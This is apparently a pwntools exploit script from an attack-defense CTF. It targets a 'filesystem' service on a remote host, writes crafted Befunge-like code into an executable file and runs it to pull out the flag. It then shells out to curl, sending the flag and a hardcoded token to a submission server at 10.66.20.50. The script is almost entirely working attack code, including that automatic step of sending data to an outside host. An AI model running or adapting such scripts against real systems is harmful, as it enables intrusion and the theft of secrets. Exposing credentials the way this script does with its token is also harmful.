from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./filesystem")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./filesystem")
else:
    p = remote(sys.argv[1],sys.argv[2])
    libc = ELF("./libc-2.27.so")
    elf = ELF("./filesystem")

def menu(choice):
    p.sendlineafter("> ",str(choice))

def getfile(name,type_,width,height,size):
    menu("touch")
    p.sendlineafter("Input filename: ",name)
    p.sendlineafter("Input filetype: ",type_)
    if type_ == "BIN":
        p.sendlineafter("Input the size: ",str(size))
    else:
        p.sendlineafter("Input the width: ",str(width))
        p.sendlineafter("Input the height: ",str(height))

def setoff(name,off):
    menu("seek")
    p.sendlineafter("Input filename: ",name)
    p.sendlineafter("Input the offset: ",str(off))

def show(name,size):
    menu("read")
    p.sendlineafter("Input filename: ",name)
    p.sendlineafter("Input the size: ",str(size))

def edit(name,content):
    while content != "":
        temp = content[:0x100]
        menu("write")
        p.sendlineafter("Input filename: ",name)
        p.sendafter("Input your content: ",temp)
        content = content[0x100:]


def init(name):
    menu("open")
    p.sendlineafter("Input filename: ",name)

def free(name):
    menu("close")
    p.sendlineafter("Input filename: ",name)

def txt_menu(choice):
    p.sendlineafter("Your operation: ",str(choice))

def txt_edit_byte(name,x,y,byte):
    menu("edit")
    p.sendlineafter("Input filename: ",name)
    txt_menu(1)
    p.sendlineafter("seperated by - :","{x}-{y}-{z}".format(x = x,y = y,z = chr(byte)))
    p.sendlineafter("Continue?(y/n):","n")

def magic(name):
    menu("./" + str(name))

def gen(code):
    res = ""
    for x in code.split("\n"):
        if x != "":
            assert len(x) <= 0x50
            res += x.ljust(0x50,"@")
    res = res.ljust(0x19 * 0x3e,"@")
    print "res:",res,hex(len(res))
    raw_input()
    for i in range(8):
        temp = ""
        for j in range(8):
            temp += chr((i | j) + 0x20)
        res += temp.ljust(0x19,"@")
    for i in range(8):
        temp = ""
        for j in range(8):
            temp += chr((i & j) + 0x20)
        res += temp.ljust(0x19,"@")
    return res

code_base = 0x555555554000
def debugf():
    if debug:
        #gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x4192)))
        gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0x3A08),b2 = hex(code_base + 0x4192)))
        #gdb.attach(p,"b *{b1}\nb *{b2}\nb *{b3}".format(b1 = hex(code_base + 0x4192),b2 = hex(code_base + 0x3B96),b3 = hex(code_base + 0x3706)))
        #gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x3B96)))

token = "NAvGwfCAQz6WrWrk4XvjQSBE8QFe43ek8q24TbFtbM9TknM2CNXMkuT42TbuvYMu2kjdxU3AbGE"
def submit(flag):
	os.system('curl http://10.66.20.50:9000/submit_flag/ -d "flag={flag}&token={token}"'.format(flag = flag,token = token))

#context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
getfile("a1","EXE",0x50,0x18,0x500)
init("a1")
#edit("a1",'~,'*0xf)
#9+7
#01g
#+-*/ ok
#v<<<<<<<<<<<<<<<+g00*8/8p00%8<g%8~+"F"%8<<@@@@@@v@@@@@@v@@@@@@v^
code = """
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~v ,_@
                                                                >~:^  
"""
code = gen(code)
edit("a1",code)
debugf()
magic("a1")
p.recvline()
flag = p.recvline().strip()
submit(flag)
